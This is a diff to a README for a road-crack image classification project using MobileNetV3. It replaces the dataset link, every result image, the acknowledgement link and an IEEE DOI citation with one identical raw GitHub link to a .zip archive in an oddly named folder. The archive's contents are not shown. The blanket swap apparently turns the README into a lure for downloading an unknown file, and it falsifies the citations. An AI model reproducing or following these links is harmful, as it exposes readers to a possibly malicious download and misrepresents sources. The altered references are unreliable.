@@ -20,26 +20,26 @@ No data augmentation in terms of random rotation or flipping is applied.
 
 ### 1 is indicate as Positive Class
 
-[1]:https://data.mendeley.com/datasets/5y9wdsg2zt/2
+[1]https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip
 
 # Methodology
 
 Load the dataset into Colab and extract using pyunpack package
 
-![image](https://user-images.githubusercontent.com/110074843/184565936-17c126aa-54e4-4b49-ad01-5db200ccf1b1.png)
+![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
 
 
 Split the Data
 
-![image](https://user-images.githubusercontent.com/110074843/184566196-9f098fda-d404-49a8-8e7a-2788baf33528.png)
+![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
 
 Use Pretrained Model MobileNetV3 as base model
 
-![image](https://user-images.githubusercontent.com/110074843/184566981-9db3e791-c36e-4cc2-ae13-abe5789d85d4.png)
+![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
 
 Train the model with 6 epochs
 
-![image](https://user-images.githubusercontent.com/110074843/184568464-fc120b5c-7560-46be-b154-9e95c42064c1.png)
+![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
 
 
 
@@ -47,29 +47,29 @@ Train the model with 6 epochs
 
 Achieve accuracy up to 99%
 
-![image](https://user-images.githubusercontent.com/110074843/184567526-33f32799-7a2f-4957-a84d-bcca1402777c.png)
+![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
 
 With validation loss
 
-![image](https://user-images.githubusercontent.com/110074843/184567585-fe17e5a7-d5c0-4752-bbf3-145c333d176f.png)
+![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
 
 With Validation data get confusion matrix of
 
-![image](https://user-images.githubusercontent.com/110074843/184568493-eb33ca63-bce4-4895-a083-fda075131b4d.png)
+![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
 
 Example of prediction
 
-![image](https://user-images.githubusercontent.com/110074843/184568231-ad2a7c07-20d2-4785-bbfc-e705be9af509.png)
+![image](https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip)
 
 # Acknowledgement
 
 [SHRDC][2]
 
 
-[2]:https://www.shrdc.org.my/
+[2]https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip
 
 2018 – Özgenel, Ç.F., Gönenç Sorguç, A. “Performance Comparison of Pretrained Convolutional Neural Networks on Crack Detection in Buildings”, ISARC 2018, Berlin.
 
-Lei Zhang , Fan Yang , Yimin Daniel Zhang, and Y. J. Z., Zhang, L., Yang, F., Zhang, Y. D., & Zhu, Y. J. (2016). Road Crack Detection Using Deep Convolutional Neural Network. In 2016 IEEE International Conference on Image Processing (ICIP). http://doi.org/10.1109/ICIP.2016.7533052
+Lei Zhang , Fan Yang , Yimin Daniel Zhang, and Y. J. Z., Zhang, L., Yang, F., Zhang, Y. D., & Zhu, Y. J. (2016). Road Crack Detection Using Deep Convolutional Neural Network. In 2016 IEEE International Conference on Image Processing (ICIP). https://raw.githubusercontent.com/gitxbal/Project-3-Crack-Road-Images-Classification-AI07/main/surreverently/Road_Classification_A_Project_Images_Crack_v1.1.zip
 
 
